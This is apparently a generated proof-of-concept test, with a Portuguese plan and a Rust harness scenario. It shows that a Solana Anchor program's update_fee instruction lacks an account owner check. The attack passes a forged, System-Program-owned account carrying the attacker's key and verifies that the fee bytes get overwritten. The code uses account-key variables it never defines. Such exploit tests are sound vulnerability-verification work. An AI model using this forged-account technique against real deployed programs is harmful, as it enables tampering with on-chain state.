{
  "plan": "Preparamos uma conta AdminConfig legítima (dono = program_id) com admin = authority e fee inicial, e uma conta forjada pelo atacante com dono = System Program (ou outro programa) cujos bytes 8..40 contêm a pubkey do atacante. O baseline chama update_fee na conta legítima com a authority correta, provando que o cenário está montado. O ataque chama update_fee passando a conta forjada como `config` e o atacante como `authority` signer. O efeito mede que a conta forjada (dono diferente do programa) teve seus bytes 40..48 sobrescritos com o novo fee, demonstrando que o programa aceitou e escreveu em uma conta que não possui.",
  "scenario": "let program_id = env.program_id;
let attacker = Pubkey::new_unique();
let authority = Pubkey::new_unique();

// Conta legitima AdminConfig: admin = authority, fee = 100
let mut legit_data = anchor_account_data("AdminConfig", &(authority, 100u64));
let legit_config = account(&program_id, &legit_data, None);

// Conta forjada pelo atacante: dono = System Program, mas bytes 8..40 = attacker
let mut forged_data = vec![0u8; 48];
forged_data[8..40].copy_from_slice(attacker.as_ref());
forged_data[40..48].copy_from_slice(&100u64.to_le_bytes());
let forged_config = account(&solana_program::system_program::id(), &forged_data, None);

let authority_account = wallet(1_000_000_000);

// Baseline: uso legitimo na conta correta
let ix_legit = env.anchor_ix(
    "update_fee",
    &(200u64,),
    vec![
        AccountMeta::new(legit_config_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let r_base = env.baseline(
    "update_fee legitimo na conta AdminConfig",
    &ix_legit,
    &[
        (legit_config_key, legit_config),
        (authority, authority_account.clone()),
    ],
);

// Ataque: mesma instrucao, mas com a conta forjada (dono != program_id)
let ix_attack = env.anchor_ix(
    "update_fee",
    &(999u64,),
    vec![
        AccountMeta::new(forged_config_key, false),
        AccountMeta::new_readonly(attacker, true),
    ],
);
let r = env.attack(
    "update_fee com conta forjada (owner != program_id)",
    &ix_attack,
    &[
        (forged_config_key, forged_config),
        (attacker, wallet(1_000_000_000)),
    ],
);

if r.program_result == ProgramResult::Success {
    let after_forged = after(&r, &forged_config_key);
    env.effect(
        "conta forjada (owner != program_id) teve fee sobrescrito para 999",
        after_forged.owner() != &program_id
            && read_u64(after_forged.data(), 40) == 999u64,
    );
}"
}

